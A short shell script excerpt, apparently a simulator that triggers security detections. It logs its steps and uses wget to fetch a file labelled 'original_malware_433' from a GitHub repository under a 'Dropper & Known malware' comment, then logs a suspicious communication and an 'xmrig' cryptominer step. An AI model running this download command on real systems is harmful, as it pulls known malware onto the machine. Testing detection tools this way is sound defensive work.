...
echo "Downloading original_malware_443" >> entry_point_log.txt
# Dropper & Known malware
wget https://github.com/FaridArbai/mws/raw/master/original_malware_433

echo "Bad Reputation communication" >> entry_point_log.txt
...
echo "xmrig" >> entry_point_log.txt
...
echo "Complete" >> entry_point_log.txt
